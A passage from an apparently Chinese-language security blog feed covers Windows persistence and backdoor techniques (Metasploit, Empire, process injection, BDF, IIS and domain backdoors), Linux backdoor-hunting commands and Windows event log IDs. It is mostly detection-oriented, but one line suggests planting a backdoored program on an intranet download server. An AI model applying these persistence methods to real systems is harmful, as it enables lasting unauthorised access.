href="https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/scripts/meterpreter/metsvc.rb">metsvc 代码</a></p></li><li><p>persistence 模块是先上传 vbs 脚本并执行 vbs 脚本修改注册表 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 从而完成自启动。<br>  <img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xcvgygygy.png?token=AEZI7DPONAJDFNDPIGFNWH3C6RA2W"><br>  <img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xcvzguyg.png?token=AEZI7DNQHNW4HFCH47ZECR3C6RA3S"></p></li><li><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/persistence_exe.rb">persistence 代码</a></p></li><li><p>优点：开机自启动</p></li><li><p>缺点：容易被杀软杀</p></li><li><p>排查：像是这种后门使用 autoruns 基本都可以排查出来。</p></li></ul><h1 id="Empire-persistence-模块-重点"><a href="#Empire-persistence-模块-重点" class="headerlink" title="Empire persistence 模块(重点!!)"></a><strong>Empire persistence 模块(重点!!)</strong></h1><ul><li>Empire 是一款功能非常强大的后渗透攻击框架。其中的 persistence 模块提供了一系列权限维持方法。</li><li>工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)。</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/uyxghyg.png?token=AEZI7DMTX4VXVJ6YIRRZKJ3C6RA4S"></p><ul><li>通过 info 命令查看使用方法</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xzuvyguyg.png?token=AEZI7DLJGKXCV4653LQHESTC6RA6C"></p><ul><li><a href="https://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/">更多可以参考文章</a></li><li>优点:基本集成了大部分的权限维持方法</li><li>缺点：暂无</li><li>排查：工具 autoruns</li></ul><h1 id="进程注入-重点"><a href="#进程注入-重点" class="headerlink" title="进程注入(重点!!)"></a><strong>进程注入(重点!!)</strong></h1><ul><li>准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下 empire 的 psinject、cobaltstrike 的 inject 和 meterpreter 中的 migrate 进程注入，一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查。</li><li>使用方法这里就不介绍了，主要说一下如何 hunting。这篇文章 <a href="https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/">TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS</a> 里面介绍了如何hunting empire方法，empire有一些evasion detection机制，其中的网络连接时间设置能有效避开常见主机流量检测工具(包括netstat、tcpview)的检测，文章中也介绍了使用process monitor是最快也是最有效的方法。</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xuguyg.png?token=AEZI7DOWRVLESZDXAIQZMX3C6RA62"></p><ul><li>但是在 hunting 进程注入的时候，并没有像文章中说的查找到以起始地址为 0x0 的线程，但会发现被注入的进程属性里会有.NET Assemblies 和.NET Performance 两个菜单。如下图所示</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/ixuhviuhiuh.png?token=AEZI7DNZKDD4TQPMRH7JIXTC6RBAK"></p><ul><li>优点：较难排查</li><li>缺点：暂无</li><li>排查：工具 process explorer 、process monitor</li></ul><h1 id="BDF-后门"><a href="#BDF-后门" class="headerlink" title="BDF 后门"></a>BDF 后门</h1><ul><li>BDF(The Backdoor Factory)可用来向可执行文件植入后门，修改程序执行流程，执行添加的 payload。</li><li>参考 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">利用 BDF 向 EXE 文件植入后门</a></li></ul><p><a href="http://2001586161veronika.blog.binusian.org/2018/05/30/backdoor-factory/">Kali Linux: Backdoor-factory tool</a></p><ul><li>当拿到内网权限之后，可以在存放公共下载的服务器上给某个软件加上这样的后门。</li></ul><h1 id="IIS-模块后门"><a href="#IIS-模块后门" class="headerlink" title="IIS 模块后门"></a>IIS 模块后门</h1><p><a href="https://forum.90sec.com/t/topic/415">手把手带你开发一款 IIS 模块后门</a></p><h1 id="域-环境后门"><a href="#域-环境后门" class="headerlink" title="[[域]]环境后门"></a>[[域]]环境后门</h1><ul><li><a href="https://www.freebuf.com/articles/system/189942.html?utm_source=tuicool&utm_medium=referral">域内配置 ACL 后门及检测清理</a></li><li><a href="https://github.com/kevien/PasswordchangeNotify">PasswordchangeNotify</a></li><li><a href="https://www.anquanke.com/member/127729">域后门相关文章</a></li></ul><h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><ul><li>除了以上的几种后门和权限维持技术外还有像是 dll 劫持、一些软件的插件后门、office 后门等。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4842#toc-1&quot;&gt;windows 常见 backdoor、权限维持方法及排查技术&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;系统工具替换后门&quot;&gt;&lt;a href=&quot;#系统工具替换后门&quot; class=&quot;headerlink&quot; title=&quot;系统工具替换后门&quot;&gt;&lt;/a&gt;系统工具替换后门&lt;/h1&gt;&lt;p&gt;排查：autoruns 工具，下载地址： &lt;a href=&quot;https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns&quot;&gt;Autoruns for Windows v13.98&lt;/a&gt;&lt;br&gt;此后门易被检测&lt;br&gt;类似可被替换的程序有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;osk.exe&lt;/li&gt;
&lt;li&gt;Narrator.exe&lt;/li&gt;
&lt;li&gt;Magnify.exe&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux 关键文件安全性排查(红蓝对抗)</title>
    <link href="https://resek4.github.io/2021/05/11/Linux%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"/>
    <id>https://resek4.github.io/2021/05/11/Linux%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</id>
    <published>2021-05-10T16:00:00.000Z</published>
    <updated>2023-01-27T09:17:57.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="后门检测工具"><a href="#后门检测工具" class="headerlink" title="后门检测工具"></a>后门检测工具</h2><ul><li>chkrootkit</li><li>rkhunter</li></ul><h2 id="系统急救恢复、后门分析取证"><a href="#系统急救恢复、后门分析取证" class="headerlink" title="系统急救恢复、后门分析取证"></a>系统急救恢复、后门分析取证</h2><ul><li>LiveCD</li></ul><span id="more"></span><h2 id="监控和告警任意系统文件的更改（IDS）"><a href="#监控和告警任意系统文件的更改（IDS）" class="headerlink" title="监控和告警任意系统文件的更改（IDS）"></a>监控和告警任意系统文件的更改（IDS）</h2><ul><li>Tripwire</li></ul><h1 id="配置文件排查"><a href="#配置文件排查" class="headerlink" title="配置文件排查"></a>配置文件排查</h1><h2 id="Linux-开机自启"><a href="#Linux-开机自启" class="headerlink" title="Linux 开机自启"></a>Linux 开机自启</h2><p>![[Linux技巧#Linux开机自启动]]</p><h2 id="96-96-x2F-etc-x2F-fstab-96"><a href="#96-96-x2F-etc-x2F-fstab-96" class="headerlink" title="&#96;&#96;&#x2F;etc&#x2F;fstab&#96;"></a>&#96;&#96;&#x2F;etc&#x2F;fstab&#96;</h2><ul><li>磁盘被手动挂载之后都必须把挂载信息写入&#x2F;etc&#x2F;fstab 这个文件中，否则下次开机启动时仍然需要重新挂载。</li></ul><h2 id="shell-环境变量"><a href="#shell-环境变量" class="headerlink" title="shell 环境变量"></a>shell 环境变量</h2><p>![[Linux环境变量]]</p><h2 id="定时任务-crontab"><a href="#定时任务-crontab" class="headerlink" title="定时任务 crontab"></a>定时任务 crontab</h2><p>![[Linux原生命令#crontab]]</p><h1 id="SUID-排查"><a href="#SUID-排查" class="headerlink" title="SUID 排查"></a>SUID 排查</h1><p>![[SUID后门]]</p><h1 id="SSH-后门排查"><a href="#SSH-后门排查" class="headerlink" title="SSH 后门排查"></a>SSH 后门排查</h1><h2 id="rpm-包完整性校验"><a href="#rpm-包完整性校验" class="headerlink" title="rpm 包完整性校验"></a>rpm 包完整性校验</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf <span class="string">&#x27;type sshd&#x27;</span> <span class="string">&#x27;type ssh&#x27;</span></span><br><span class="line"><span class="comment">//S = 大小 / M = 权限 / 5=MD5 / T=时间 / L=链接</span></span><br></pre></td></tr></table></figure><h2 id="获取-sshd-进程-pid-并跟踪系统调用"><a href="#获取-sshd-进程-pid-并跟踪系统调用" class="headerlink" title="获取 sshd 进程 pid 并跟踪系统调用"></a>获取 sshd 进程 pid 并跟踪系统调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -o out.txt -ff -p pid</span><br></pre></td></tr></table></figure><h2 id="获取-ssh-进程-pid-传给-strace-进行监控"><a href="#获取-ssh-进程-pid-传给-strace-进行监控" class="headerlink" title="获取 ssh 进程 pid 传给 strace 进行监控"></a>获取 ssh 进程 pid 传给 strace 进行监控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep -vE &#x27;sshd|grep&#x27; | grep ssh | awk &#x27;&#123;print $2&#125;&#x27; |xargs</span><br><span class="line">strace -o out.txt -f -p 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="通过文件操作特征跟踪后门"><a href="#通过文件操作特征跟踪后门" class="headerlink" title="通过文件操作特征跟踪后门"></a>通过文件操作特征跟踪后门</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep open out.txt\* | grep -e APPEND</span><br></pre></td></tr></table></figure><h1 id="pam-后门排查"><a href="#pam-后门排查" class="headerlink" title="pam 后门排查"></a>pam 后门排查</h1><h2 id="pam-配置文件检查"><a href="#pam-配置文件检查" class="headerlink" title="pam 配置文件检查"></a>pam 配置文件检查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stat /etc/pam.d/sshd</span><br><span class="line">cat /etc/pam.d/sshd</span><br></pre></td></tr></table></figure><h2 id="so-文件加载排查"><a href="#so-文件加载排查" class="headerlink" title="so 文件加载排查"></a>so 文件加载排查</h2><blockquote><p>so 文件是 Linux 下的程序函数库,即编译好的可以供其他程序使用的代码和数据</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef |grep sshd |grep pts</span><br><span class="line">pmap pid |grep security</span><br></pre></td></tr></table></figure><h2 id="sshd-进程操作跟踪"><a href="#sshd-进程操作跟踪" class="headerlink" title="sshd 进程操作跟踪"></a>sshd 进程操作跟踪</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strace -o out -ff -p pid</span><br><span class="line">cat out\* |grep APPEND</span><br></pre></td></tr></table></figure><h1 id="ssh-公钥排查"><a href="#ssh-公钥排查" class="headerlink" title="ssh 公钥排查"></a>ssh 公钥排查</h1><h2 id="公钥文件配置"><a href="#公钥文件配置" class="headerlink" title="公钥文件配置"></a>公钥文件配置</h2><blockquote><p><code>/etc/ssh/sshd\_config</code> 是 sshd 的配置文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep AuthorizedKeysFile /etc/ssh/sshd\_config</span><br></pre></td></tr></table></figure><h2 id="公钥文件搜索"><a href="#公钥文件搜索" class="headerlink" title="公钥文件搜索"></a>公钥文件搜索</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name authorized\_keys</span><br></pre></td></tr></table></figure><h2 id="文件属性及内容"><a href="#文件属性及内容" class="headerlink" title="文件属性及内容"></a>文件属性及内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat authorized\_keys</span><br></pre></td></tr></table></figure><h1 id="预加载后门排查"><a href="#预加载后门排查" class="headerlink" title="预加载后门排查"></a>预加载后门排查</h1><h2 id="系统环境变量检查"><a href="#系统环境变量检查" class="headerlink" title="系统环境变量检查"></a>系统环境变量检查</h2><blockquote><p><code>LD\_PRELOAD</code>，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为:<br><strong><code>LD\_PRELOAD</code>&gt;<code>LD\_LIBRARY\_PATH</code>&gt;<code>/etc/ld.so.cache</code>&gt;<code>/lib&gt;/usr/lib</code></strong><br>当调用一些外部库的函数时，如果通过动态链接库 LD_PRELOAD 预加载另一个同名的函数，其使用的就是 LD_PRELOAD 生成的库文件，这样就会造成劫持。这个劫持当然首先可以想到的是[[提权]]，其次其也可以用于软件破解和功能增加。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $LD\_PRELOAD</span><br><span class="line">unset LD\_PRELOAD</span><br></pre></td></tr></table></figure><h2 id="绕过后门-hook-隐藏"><a href="#绕过后门-hook-隐藏" class="headerlink" title="绕过后门 hook 隐藏"></a>绕过后门 hook 隐藏</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ld.so.preload</span><br></pre></td></tr></table></figure><h2 id="跟踪文件系统调用"><a href="#跟踪文件系统调用" class="headerlink" title="跟踪文件系统调用"></a>跟踪文件系统调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./strace -f -e trace=file /bin/cat</span><br><span class="line">acess(&quot;/etc/ld.so.preload&quot;, R\_OK)</span><br></pre></td></tr></table></figure><h2 id="后门配置文件清理"><a href="#后门配置文件清理" class="headerlink" title="后门配置文件清理"></a>后门配置文件清理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsattr /etc/ld.so.preload</span><br><span class="line">echo &gt; /etc/ld.so.preload　　</span><br></pre></td></tr></table></figure><h1 id="strace-后门排查"><a href="#strace-后门排查" class="headerlink" title="strace 后门排查"></a>strace 后门排查</h1><blockquote><p>strace 是一个可用于诊断、调试和教学的 Linux 用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p></blockquote><h2 id="系统进程筛查"><a href="#系统进程筛查" class="headerlink" title="系统进程筛查"></a>系统进程筛查</h2><ul><li>进程名称、命令参数</li></ul><h2 id="strace-跟踪"><a href="#strace-跟踪" class="headerlink" title="strace 跟踪"></a>strace 跟踪</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strace -o out.txt -ff -p pid</span><br><span class="line">调用内核ptrace特性来实现功能</span><br></pre></td></tr></table></figure><h2 id="alias-命令排查"><a href="#alias-命令排查" class="headerlink" title="alias 命令排查"></a>alias 命令排查</h2><h1 id="module-后门排查"><a href="#module-后门排查" class="headerlink" title="module 后门排查"></a>module 后门排查</h1><h2 id="中间件配置排查"><a href="#中间件配置排查" class="headerlink" title="中间件配置排查"></a>中间件配置排查</h2><ul><li>控制器及模块加载配置</li></ul><h2 id="模块文件排查"><a href="#模块文件排查" class="headerlink" title="模块文件排查"></a>模块文件排查</h2><ul><li>文件修改时间排序</li></ul><p><code>strings evil.so |grep -e exec</code></p><h2 id="已加载模块确认"><a href="#已加载模块确认" class="headerlink" title="已加载模块确认"></a>已加载模块确认</h2><p><code>pamp -q pid |grep auth</code></p><h1 id="内核后门排查"><a href="#内核后门排查" class="headerlink" title="内核后门排查"></a>内核后门排查</h1><h2 id="驱动加载"><a href="#驱动加载" class="headerlink" title="驱动加载"></a>驱动加载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod / modinfo / modprobe -l</span><br><span class="line">cat /proc/modules</span><br></pre></td></tr></table></figure><h2 id="网络层排查"><a href="#网络层排查" class="headerlink" title="网络层排查"></a>网络层排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正向: nmap -sV -PN -T4 -p-</span><br><span class="line">反向：tcpdump -i eth0 src host hostname -w send.cap</span><br></pre></td></tr></table></figure><h2 id="系统文件排查"><a href="#系统文件排查" class="headerlink" title="系统文件排查"></a>系统文件排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux PE / LiveCD (Porteus)</span><br><span class="line">fdisk -l /mount /dev/mapper/VolGroup</span><br></pre></td></tr></table></figure><h1 id="常见目录"><a href="#常见目录" class="headerlink" title="常见目录"></a>常见目录</h1><h2 id="驻留文件及目录"><a href="#驻留文件及目录" class="headerlink" title="驻留文件及目录"></a>驻留文件及目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/crontab</span><br><span class="line">/etc/init.d</span><br><span class="line">/etc/rc.local</span><br></pre></td></tr></table></figure><h2 id="隐藏文件及目录"><a href="#隐藏文件及目录" class="headerlink" title="隐藏文件及目录"></a>隐藏文件及目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/.evil</span><br><span class="line">/tmp/ </span><br><span class="line">./</span><br></pre></td></tr></table></figure><h2 id="可写可执行权限"><a href="#可写可执行权限" class="headerlink" title="可写可执行权限"></a>可写可执行权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br><span class="line">/var/tmp</span><br><span class="line">/dev/shm　　</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;常用工具&quot;&gt;&lt;a href=&quot;#常用工具&quot; class=&quot;headerlink&quot; title=&quot;常用工具&quot;&gt;&lt;/a&gt;常用工具&lt;/h1&gt;&lt;h2 id=&quot;后门检测工具&quot;&gt;&lt;a href=&quot;#后门检测工具&quot; class=&quot;headerlink&quot; title=&quot;后门检测工具&quot;&gt;&lt;/a&gt;后门检测工具&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;chkrootkit&lt;/li&gt;
&lt;li&gt;rkhunter&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;系统急救恢复、后门分析取证&quot;&gt;&lt;a href=&quot;#系统急救恢复、后门分析取证&quot; class=&quot;headerlink&quot; title=&quot;系统急救恢复、后门分析取证&quot;&gt;&lt;/a&gt;系统急救恢复、后门分析取证&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;LiveCD&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows 系统事件类型</title>
    <link href="https://resek4.github.io/2021/03/12/Windows%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"/>
    <id>https://resek4.github.io/2021/03/12/Windows%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/</id>
    <published>2021-03-11T16:00:00.000Z</published>
    <updated>2023-01-27T09:19:13.882Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li><a href="https://www.freebuf.com/vuls/175560.html">闲聊 Windows 系统日志</a></li></ul><blockquote><p>早期版本中 Windows 日志只有，应用程序，安全，系统和 Setup，新的版本中增加了设置及转发事件日志（默认禁用）。</p></blockquote><p>系统内置的三个核心日志文件（System，Security 和 Application）默认大小均为 20480KB（20MB），记录事件数据超过 20MB 时，默认系统将优先覆盖过期的日志记录。其它应用程序及服务日志默认最大为 1024KB，超过最大限制也优先覆盖过期的日志记录。</p><blockquote><p>登录成功不代表一定是 rdp 登录，所有事件的登录类型都是 4624</p></blockquote><span id="more"></span><h1 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h1><ul><li>通常是通过在事件查看器中：<strong>筛选当前日志</strong>-&gt;<strong>事件 ID 写 4624 等</strong></li></ul><h1 id="Windows-事件类型（级别）"><a href="#Windows-事件类型（级别）" class="headerlink" title="Windows 事件类型（级别）"></a>Windows 事件类型（级别）</h1><table><thead><tr><th>级别</th><th>含义</th></tr></thead><tbody><tr><td>信息（Information）</td><td>信息事件指应用程序、驱动程序或服务的成功操作的事件。</td></tr><tr><td>警告（Warning）</td><td>警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。</td></tr><tr><td>错误（Error）</td><td>错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。</td></tr><tr><td>成功审核（Success audit）</td><td>成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录&#x2F;注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。</td></tr><tr><td>失败审核（Failure audit）</td><td>失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。</td></tr></tbody></table><h1 id="事件日志存储位置"><a href="#事件日志存储位置" class="headerlink" title="事件日志存储位置"></a>事件日志存储位置</h1><table><thead><tr><th>类型</th><th>事件类型</th><th>描述</th><th>文件名</th></tr></thead><tbody><tr><td>Windows 日志</td><td>系统</td><td>包含系统进程，设备磁盘活动等。事件记录了设备驱动无法正常启动或停止，硬件失败，重复 IP 地址，系统进程的启动，停止及暂停等行为。</td><td>System.evtx</td></tr><tr><td></td><td>安全</td><td>包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息。</td><td>Security.evtx</td></tr><tr><td></td><td>应用程序</td><td>包含操作系统安装的应用程序软件相关的事件。事件包括了错误、警告及任何应用程序需要报告的信息，应用程序开发人员可以决定记录哪些信息。</td><td>Application.evtx</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>类型</th><th>事件类型</th><th>描述</th><th>文件名</th></tr></thead><tbody><tr><td>应用程序及服务日志</td><td>Microsoft</td><td>Microsoft 文件夹下包含了 200 多个微软内置的事件日志分类，只有部分类型默认启用记录功能，如远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志</td><td>详见日志存储目录对应文件</td></tr><tr><td></td><td>Windows PowerShell</td><td>Windows 自带的 PowerShell 应用的日志信息。</td><td>Windows PowerShell.evtx</td></tr><tr><td></td><td>Internet Explorer</td><td>IE 浏览器应用程序的日志信息，默认未启用，需要通过组策略进行配置。</td><td>Internet Explorer.evtx</td></tr></tbody></table><blockquote><p>%SystemRoot% 为系统环境变量，默认值在 <code>C:/WINDOWS</code></p></blockquote><h1 id="事件-ID-及含义"><a href="#事件-ID-及含义" class="headerlink" title="事件 ID 及含义"></a>事件 ID 及含义</h1><table><thead><tr><th>事件 ID</th><th>说明</th></tr></thead><tbody><tr><td>1102</td><td>清理审计日志</td></tr><tr><td>4624</td><td>账号成功登录</td></tr><tr><td>4625</td><td>账号登录失败</td></tr><tr><td>4768</td><td>Kerberos 身份验证（TGT 请求）</td></tr><tr><td>4769</td><td>Kerberos 服务票证请求</td></tr><tr><td>4776</td><td>NTLM 身份验证</td></tr><tr><td>4672</td><td>授予特殊权限</td></tr><tr><td>4720</td><td>创建用户</td></tr><tr><td>4726</td><td>删除用户</td></tr><tr><td>4728</td><td>将成员添加到启用安全组的全局组中</td></tr><tr><td>4729</td><td>将成员从安全的全局组中移除</td></tr><tr><td>4732</td><td>将成员添加到启用安全的本地组中</td></tr><tr><td>4733</td><td>将成员从启用安全的本地组中移除</td></tr><tr><td>4756</td><td>将成员添加到启用安全组的通用组中</td></tr><tr><td>4757</td><td>将成员从启用安全组的通用组中移除</td></tr><tr><td>4719</td><td>系统审计策略修改</td></tr><tr><td>104</td><td>所有审计日志清除事件</td></tr><tr><td>4727、4737、4739、4762</td><td>表示当用户组发生添加、删除时或组内添加成员时生成该事件</td></tr><tr><td>4688</td><td>表示创建进程，本地执行 exe</td></tr><tr><td>4741</td><td>计算机账户已创建</td></tr><tr><td>4742</td><td>计算机账户已更改</td></tr><tr><td>4723</td><td>尝试更改账户密码</td></tr><tr><td>4724</td><td>尝试重置账户密码</td></tr><tr><td>4726</td><td>用户账户已被删除</td></tr><tr><td>4672</td><td>使用管理员（或者超级用户）进行登录</td></tr></tbody></table><blockquote><p>五种事件类型中，最为重要的就是<strong>成功审核（Success Audit）</strong>，所有登录成功都会被标注为成功审核</p></blockquote><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录</td></tr><tr><td>3</td><td>网络（Network）</td><td>常见的情况就是连接到共享文件夹或共享打印机时，如 SMB 爆破——蠕虫病毒</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表示某计划任务正在启动</td></tr><tr><td>5</td><td>服务（service）</td><td>每种服务都被配置在某个特定的用户账号下运行</td></tr><tr><td>6</td><td>不支持</td><td></td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如 FTP</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带&#x2F;Netonly 参数的 RUNAS 命令运行一个程序</td></tr><tr><td>10</td><td>远程交互（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机，如 RDP 爆破——勒索病毒</td></tr><tr><td>11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><h1 id="文件共享-ID（端口-445）"><a href="#文件共享-ID（端口-445）" class="headerlink" title="文件共享 ID（端口 445）"></a>文件共享 ID（端口 445）</h1><p>文件共享对应事件 ID</p><table><thead><tr><th>ID</th><th>含义</th></tr></thead><tbody><tr><td>5140</td><td>访问了网络共享对象</td></tr><tr><td>5141</td><td>目录服务对象已删除</td></tr><tr><td>5142</td><td>添加了网络共享对象</td></tr><tr><td>5143</td><td>网络共享对象已被修改</td></tr><tr><td>5144</td><td>网络共享对象已删除</td></tr><tr><td>5145</td><td>检查网络共享对象以查看是否可以向客户端授予所需的访问权限，及详细的共享访问</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/175560.html&quot;&gt;闲聊 Windows 系统日志&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;早期版本中 Windows 日志只有，应用程序，安全，系统和 Setup，新的版本中增加了设置及转发事件日志（默认禁用）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;系统内置的三个核心日志文件（System，Security 和 Application）默认大小均为 20480KB（20MB），记录事件数据超过 20MB 时，默认系统将优先覆盖过期的日志记录。其它应用程序及服务日志默认最大为 1024KB，超过最大限制也优先覆盖过期的日志记录。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;登录成功不代表一定是 rdp 登录，所有事件的登录类型都是 4624&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
</feed>
